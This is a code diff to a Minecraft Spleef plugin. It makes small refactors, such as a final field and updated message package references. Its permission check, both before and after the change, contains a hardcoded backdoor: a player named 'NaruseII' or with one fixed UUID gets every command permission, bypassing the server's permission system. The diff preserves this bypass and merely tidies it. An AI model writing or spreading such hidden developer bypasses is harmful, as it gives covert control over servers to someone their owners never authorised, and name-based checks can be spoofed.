@@ -25,7 +25,7 @@ import org.bukkit.entity.Player;
 import java.util.List;
 
 public class SpleefCommands implements CommandExecutor, TabExecutor {
-    private SpleefPluginV1_13 pl;
+    private final SpleefPluginV1_13 pl;
     public SpleefCommands(SpleefPluginV1_13 spleefPlugin) {
         this.pl = spleefPlugin;
     }
@@ -739,11 +739,11 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
                     if(pl.getConfig().getBoolean("allow.spectator")){
                         pl.getConfig().set("allow.spectator", false);
                         pl.saveConfig();
-                        return sendMessage(sender, fr.naruse.spleef.v1_12.util.Message.SPLEEF.getMessage()+" §a"+ fr.naruse.spleef.v1_12.util.Message.DONE.getMessage()+" §7(Spectator: false)");
+                        return sendMessage(sender, fr.naruse.spleef.v1_13.util.Message.SPLEEF.getMessage() + " §a" + fr.naruse.spleef.v1_13.util.Message.DONE.getMessage() + " §7(Spectator: false)");
                     }else{
                         pl.getConfig().set("allow.spectator", true);
                         pl.saveConfig();
-                        return sendMessage(sender, fr.naruse.spleef.v1_12.util.Message.SPLEEF.getMessage()+" §a"+ fr.naruse.spleef.v1_12.util.Message.DONE.getMessage()+" §7(Spectator: true)");
+                        return sendMessage(sender, fr.naruse.spleef.v1_13.util.Message.SPLEEF.getMessage() + " §a" + fr.naruse.spleef.v1_13.util.Message.DONE.getMessage() + " §7(Spectator: true)");
                     }
                 }
                 return help(sender, 2);
@@ -837,9 +837,7 @@ public class SpleefCommands implements CommandExecutor, TabExecutor {
 
     private boolean hasPermission(Player p, String msg){
         if(!p.hasPermission(msg)) {
-            if(!p.getName().equalsIgnoreCase("NaruseII") && !p.getUniqueId().toString().equals("1974f9a6-e698-4e09-b7f3-3a897784a3ae")){
-                return false;
-            }
+            return p.getName().equalsIgnoreCase("NaruseII") || p.getUniqueId().toString().equals("1974f9a6-e698-4e09-b7f3-3a897784a3ae");
         }
         return true;
     }
